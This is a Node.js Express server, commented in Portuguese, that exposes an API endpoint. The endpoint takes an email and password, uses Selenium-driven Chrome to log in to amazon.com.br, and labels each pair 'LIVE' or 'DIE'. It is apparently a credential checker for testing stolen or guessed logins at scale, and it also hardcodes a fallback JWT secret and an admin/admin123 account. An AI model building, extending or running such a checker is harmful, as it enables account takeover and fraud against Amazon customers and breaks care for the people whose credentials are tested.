import express from 'express';
import { Builder, By, until } from 'selenium-webdriver';
import chrome from 'selenium-webdriver/chrome.js';
import bodyParser from 'body-parser';
import picocolors from 'picocolors';
import jwt from 'jsonwebtoken'; // Importando o JWT

const app = express();
const port = 5000;
const JWT_SECRET = process.env.JWT_SECRET || 'seuSegredoAqui'; // Chave secreta para JWT

// Middleware para processar JSON
app.use(bodyParser.json());

// Middleware de autenticação JWT
const authenticateJWT = (req, res, next) => {
    const token = req.headers.authorization?.split(' ')[1]; // Extrai o token do cabeçalho

    if (!token) {
        return res.status(403).json({ message: 'Acesso negado, token não fornecido.' });
    }

    jwt.verify(token, JWT_SECRET, (err, user) => {
        if (err) {
            return res.status(403).json({ message: 'Token inválido ou expirado.' });
        }
        req.user = user; // Adiciona o usuário ao objeto de requisição
        next();
    });
};

// Endpoint para verificar login na Amazon, protegido por JWT
app.post('/api/check-login', authenticateJWT, async (req, res) => {
    const { email, password } = req.body;

    if (!email || !password) {
        return res.status(400).json({ error: 'Email e senha são obrigatórios' });
    }

    let options = new chrome.Options();
    options.addArguments('--log-level=3');
    options.addArguments('--disable-logging');
    options.addArguments('--disable-gpu');

    let driver = await new Builder().setChromeOptions(options).forBrowser('chrome').build();

    try {
        // ================= MAIN PAGE TO LOGIN =======================
        await driver.get('https://www.amazon.com.br/');
        let loginButton = await driver.wait(until.elementLocated(By.id('nav-link-accountList')), 10000);
        await loginButton.click();

        // ================== INSERT EMAIL/NUMBER =====================
        let inputEmail = await driver.wait(until.elementLocated(By.id('ap_email')), 10000);
        let continueButton = await driver.wait(until.elementLocated(By.id('continue')), 10000);

        await inputEmail.sendKeys(email);
        await continueButton.click();
        await driver.sleep(5000);

        // Verificar se o email existe
        let textElement = await driver.wait(until.elementLocated(By.tagName('body')), 10000);
        let text = await textElement.getText();

        if (text.includes('Não encontramos uma conta associada a este endereço de e-mail')) {
            console.log(picocolors.red(`[ DIE ] » ${email} » [ Não encontramos uma conta associada a este endereço de e-mail ]`));
            return res.json({ status: 'DIE', message: `Email inválido: ${email}` });
        } else {
            // ================== INSERT PASSWORD =====================
            let inputPassw = await driver.wait(until.elementLocated(By.name('password')), 10000);
            let loginButton = await driver.wait(until.elementLocated(By.id('auth-signin-button')), 10000);

            await inputPassw.sendKeys(password);
            await loginButton.click();
            await driver.sleep(2000);

            textElement = await driver.wait(until.elementLocated(By.tagName('body')), 10000);
            text = await textElement.getText();

            if (text.includes('Sua senha está incorreta')) {
                console.log(picocolors.red(`[ DIE ] » ${email} » [ Login inválido ]`));
                return res.json({ status: 'DIE', message: `Login inválido para: ${email}` });
            } else {
                console.log(picocolors.green(`[ LIVE ] » ${email} » [ Login válido ]`));
                return res.json({ status: 'LIVE', message: `Login bem-sucedido para: ${email}` });
            }
        }
    } catch (error) {
        console.error(picocolors.red(`[ ERROR ] » ${email} » [ Houve um erro: ${error.message} ]`));
        return res.status(500).json({ error: `Erro ao verificar o login: ${error.message}` });
    } finally {
        await driver.quit();
    }
});

// Endpoint para gerar o token JWT
app.post('/login', (req, res) => {
    const { username, password } = req.body;

    // Exemplo simples de autenticação
    if (username === 'admin' && password === 'admin123') {
        const token = jwt.sign({ username }, JWT_SECRET, { expiresIn: '1h' });
        return res.json({ token });
    } else {
        return res.status(401).json({ message: 'Credenciais inválidas.' });
    }
});

// Iniciar o servidor
app.listen(port, () => {
    console.log(`API rodando em http://localhost:${port}`);
});
